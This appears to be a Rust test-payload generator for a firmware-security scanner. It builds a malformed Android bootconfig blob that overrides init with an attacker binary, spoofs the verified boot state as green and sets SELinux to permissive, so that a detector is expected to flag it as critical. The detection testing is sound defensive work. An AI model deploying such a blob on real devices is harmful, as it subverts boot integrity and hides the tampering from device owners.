use anyhow::Result;
use byteorder::{LittleEndian, WriteBytesExt};

use crate::{Arch, ExpectedFinding, Payload, PayloadConfig};
use barzakh_core::Severity;

pub struct AndroidBootconfigInjectPayload;

impl Payload for AndroidBootconfigInjectPayload {
    fn name(&self) -> &str {
        "android_bootconfig_inject"
    }

    fn arch(&self) -> Arch {
        Arch::Aarch64
    }

    fn generate(&self, config: &PayloadConfig) -> Result<Vec<u8>> {
        let size = config.size.max(0x2000);
        let mut data = vec![0u8; size];

        // Oversized bootconfig size field (placed before the magic trailer)
        // Size = 0x20000 (128KB, exceeds 64KB boundary)
        let size_offset = 0x0;
        let mut cursor = std::io::Cursor::new(&mut data[size_offset..size_offset + 4]);
        cursor.write_u32::<LittleEndian>(0x0002_0000)?;

        // Checksum placeholder
        let mut cursor = std::io::Cursor::new(&mut data[4..8]);
        cursor.write_u32::<LittleEndian>(0xDEAD_BEEF)?;

        // Bootconfig magic trailer "#BOOTCONFIG\n"
        let magic_offset = 8;
        let magic = b"#BOOTCONFIG\n";
        data[magic_offset..magic_offset + magic.len()].copy_from_slice(magic);

        // Malicious bootconfig parameters after the magic
        let params_offset = magic_offset + magic.len();

        // Inject init= override (executes attacker binary as PID 1)
        let init_param = b"androidboot.init=/data/local/tmp/evil_init\n";
        data[params_offset..params_offset + init_param.len()].copy_from_slice(init_param);

        // Spoof verified boot state to "green" (pretend device is locked)
        let vb_offset = params_offset + init_param.len();
        let vb_param = b"androidboot.verifiedbootstate=green\n";
        data[vb_offset..vb_offset + vb_param.len()].copy_from_slice(vb_param);

        // Disable SELinux enforcement
        let se_offset = vb_offset + vb_param.len();
        let se_param = b"androidboot.selinux=permissive\n";
        data[se_offset..se_offset + se_param.len()].copy_from_slice(se_param);

        Ok(data)
    }

    fn expected_detections(&self) -> Vec<ExpectedFinding> {
        vec![ExpectedFinding {
            detector: "android_bootconfig".to_string(),
            min_severity: Severity::Critical,
        }]
    }
}
